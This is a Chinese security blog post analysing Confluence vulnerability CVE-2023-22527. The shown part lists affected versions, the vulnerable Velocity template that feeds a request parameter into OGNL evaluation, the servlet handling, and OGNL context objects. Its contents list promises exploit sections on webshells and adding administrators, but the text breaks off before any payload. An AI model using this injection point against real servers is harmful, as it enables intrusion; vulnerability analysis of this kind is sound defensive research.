<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Confluence漏洞分析">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-22527-confluecne 漏洞分析和利用链构造">
<meta property="og:url" content="http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/index.html">
<meta property="og:site_name" content="九指 | [ninefiger&#39;s blog]">
<meta property="og:description" content="Confluence漏洞分析">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092254527.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093238153.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092351860.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092410237.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092427369.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092441988.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092452639.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092504970.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092517172.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092529936.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092539244.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092556068.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093308942.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092615933.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092625167.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092635746.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092646368.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092658143.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092707896.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092718021.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092755873.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092806193.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092815918.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093400959.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092833894.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092848609.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092910464.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092921491.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092933765.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092944601.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092955327.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093005381.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093052624.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093111575.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093128794.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093200943.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093212186.png">
<meta property="article:published_time" content="2024-03-07T01:01:00.000Z">
<meta property="article:modified_time" content="2024-03-07T02:03:38.686Z">
<meta property="article:author" content="ninefiger">
<meta property="article:tag" content="漏洞分析">
<meta property="article:tag" content="java">
<meta property="article:tag" content="Confluence">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blog.ninefiger.top/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092254527.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
        
      
    
    <!-- title -->
    <title>CVE-2023-22527-confluecne 漏洞分析和利用链构造</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="九指 | [ninefiger&#39;s blog]" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="下一篇 " href="/2022/11/11/fastjson%201.2.73-12.80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&text=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&title=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&is_video=false&description=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2023-22527-confluecne 漏洞分析和利用链构造&body=Check out this article: http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&title=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&title=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&title=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&title=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&name=CVE-2023-22527-confluecne 漏洞分析和利用链构造&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&t=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">1. 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B"><span class="toc-number">2.</span> <span class="toc-text">2. 测试一下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">3. 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-text-inline-vm"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 text-inline.vm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-RCE"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-EXP"><span class="toc-number">4.</span> <span class="toc-text">4. EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%8B%A6%E6%88%AA"><span class="toc-number">4.1.</span> <span class="toc-text">4.1. 命令执行拦截</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E9%99%90%E5%88%B6"><span class="toc-number">4.2.</span> <span class="toc-text">4.2. 绕过黑名单限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E5%9B%9E%E6%98%BE"><span class="toc-number">4.3.</span> <span class="toc-text">4.3. 回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E5%A4%B1%E8%B4%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">4.4.</span> <span class="toc-text">4.4. 添加管理员失败及绕过思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">4.5.</span> <span class="toc-text">4.5. 加载字节码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5-1-JDK9%E4%BB%A5%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E9%99%90%E5%88%B6"><span class="toc-number">4.5.1.</span> <span class="toc-text">4.5.1 JDK9以上的一些限制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E4%BD%BF%E7%94%A8%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E5%92%8C%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.6.</span> <span class="toc-text">4.6. 使用类加载实现添加管理员和内存马</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2023-22527-confluecne 漏洞分析和利用链构造
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ninefiger</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-07T01:01:00.000Z" itemprop="datePublished">2024-03-07</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/">攻防研究</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Confluence/" rel="tag">Confluence</a>, <a class="tag-link-link" href="/tags/java/" rel="tag">java</a>, <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><blockquote>
<p>[1] <a target="_blank" rel="noopener" href="https://forum.butian.net/share/2741">https://forum.butian.net/share/2741</a><br>[2] bypass 沙箱： <a target="_blank" rel="noopener" href="https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY_velocity.struts2.context">https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY_velocity.struts2.context</a><br>[3] <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2023-22527/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2023-22527/README.zh-cn.md</a><br>OGNL 沙箱利用<br>[4] <a target="_blank" rel="noopener" href="https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/">https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/</a><br>前置漏洞<br>[5] CVE-2021-26084和CVE-2022-26134</p>
</blockquote>
<p>覆盖版本</p>
<ul>
<li>8.5.0 ≤ version ≤ 8.5.3</li>
<li>8.0.x，8.1.x，8.2.x，8.3.x，8.4.x</li>
</ul>
<h2 id="2-测试一下"><a href="#2-测试一下" class="headerlink" title="2. 测试一下"></a>2. 测试一下</h2><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092254527.png" alt="image-20240307092254527"></p>
<h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3. 漏洞分析"></a>3. 漏洞分析</h2><h3 id="3-1-text-inline-vm"><a href="#3-1-text-inline-vm" class="headerlink" title="3.1 text-inline.vm"></a>3.1 text-inline.vm</h3><p>存在漏洞点的模板，这样的漏洞点还有其他一些模板</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#set( $labelValue = $stack.findValue(&quot;getText(&#x27;$parameters.label&#x27;)&quot;) )</span><br><span class="line">#if( !$labelValue )</span><br><span class="line">    #set( $labelValue = $parameters.label )</span><br><span class="line">#end</span><br><span class="line"></span><br><span class="line">#if (!$parameters.id)</span><br><span class="line">    #set( $parameters.id = $parameters.name)</span><br><span class="line">#end</span><br><span class="line"></span><br><span class="line">&lt;label id=<span class="string">&quot;$&#123;parameters.id&#125;-label&quot;</span> <span class="keyword">for</span>=<span class="string">&quot;$parameters.id&quot;</span>&gt;</span><br><span class="line">$!labelValue</span><br><span class="line">#if($parameters.required)</span><br><span class="line">    &lt;span class=&quot;aui-icon icon-required&quot;&gt;&lt;/span&gt;</span><br><span class="line">    &lt;span class=&quot;content&quot;&gt;$parameters.required&lt;/span&gt;</span><br><span class="line">#end</span><br><span class="line">&lt;/label&gt;</span><br><span class="line"></span><br><span class="line">#parse(&quot;/template/aui/text-include.vm&quot;)</span><br></pre></td></tr></table></figure>
<p><code>.vm</code>请求由 <code>ConfluenceVelocityServlet</code> 处理<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093238153.png" alt="image-20240307093238153"><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092351860.png" alt="image-20240307092351860"></p>
<ul>
<li>获取模板</li>
</ul>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092410237.png" alt="image-20240307092410237"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Template <span class="title">getTemplate</span><span class="params">(String name, String encoding)</span> <span class="keyword">throws</span> ResourceNotFoundException, ParseErrorException, Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getVelocityManager().getVelocityEngine().getTemplate(name, encoding);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>合并模板</li>
</ul>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092427369.png" alt="image-20240307092427369"><br>… 模板渲染过程省略</p>
<ul>
<li><p><code>$stack.findValue()</code>的表达式解析<br>:::success<br>ONGL 中$、#都可以内置对象和属性，内置对象。<br>:::</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#root：表示OGNL表达式的根对象。在一些情况下，如果需要访问整个对象图的根对象，可以使用#root。</span><br><span class="line">#this：表示当前正在处理的对象。在OGNL表达式中，#this可以用来引用当前正在处理的对象。</span><br><span class="line">#context：表示OGNL的上下文对象。在一些情况下，可能需要访问OGNL的上下文对象，比如在编写自定义函数时。</span><br><span class="line">#session：表示当前会话的会话对象。在Web应用中，可以使用#session来访问当前用户的会话信息。</span><br><span class="line">#request：表示当前HTTP请求对象。在Web应用中，可以使用#request来访问当前HTTP请求的参数和属性。</span><br><span class="line">#application：表示当前Web应用的应用对象。在Web应用中，可以使用#application来访问应用级别的参数和属性。</span><br><span class="line">#parameters：表示当前HTTP请求的参数映射。在Web应用中，可以使用#parameters来访问当前HTTP请求的参数。</span><br><span class="line">#attrs：表示当前HTTP请求的属性映射。在Web应用中，可以使用#attrs来访问当前HTTP请求的属性。</span><br><span class="line">#sessionScope、#requestScope、#applicationScope：分别表示会话、请求和应用作用域中的属性映射。这些属性可用于访问各个作用域中的属性。</span><br></pre></td></tr></table></figure>
